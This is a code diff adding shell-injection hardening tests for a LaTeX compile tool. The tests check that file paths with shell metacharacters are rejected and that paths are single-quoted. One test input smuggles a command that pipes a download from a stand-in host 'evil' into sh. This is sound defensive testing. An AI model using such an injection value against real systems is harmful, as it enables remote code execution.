@@ -234,3 +234,23 @@ describe('latexCompile — compiler routing', () => {
     expect(result).toContain('successful');
   });
 });
+
+describe('latexCompile — shell-injection hardening', () => {
+  it('rejects a file path with shell metacharacters before running anything', async () => {
+    const session = makeSession('');
+    const ctx = makeContext(true, 'pdflatex', session);
+    const result = await latexCompile({ file: 'main.tex"; curl evil | sh; echo "' }, ctx);
+    expect(result).toContain('shell metacharacters');
+    expect(session.execute).not.toHaveBeenCalled();
+  });
+
+  it('single-quotes the file path in the compile command', async () => {
+    const session = makeSession('Output written on main.pdf');
+    const ctx = makeContext(true, 'pdflatex', session);
+    await latexCompile({ file: 'paper/main.tex' }, ctx);
+    const calls = session.execute.mock.calls as unknown[][];
+    const compileCall = (calls as [string][]).find(([cmd]) => cmd.includes('pdflatex'));
+    expect(compileCall![0]).toContain("'paper/main.tex'");
+    expect(compileCall![0]).not.toContain('"paper/main.tex"');
+  });
+});
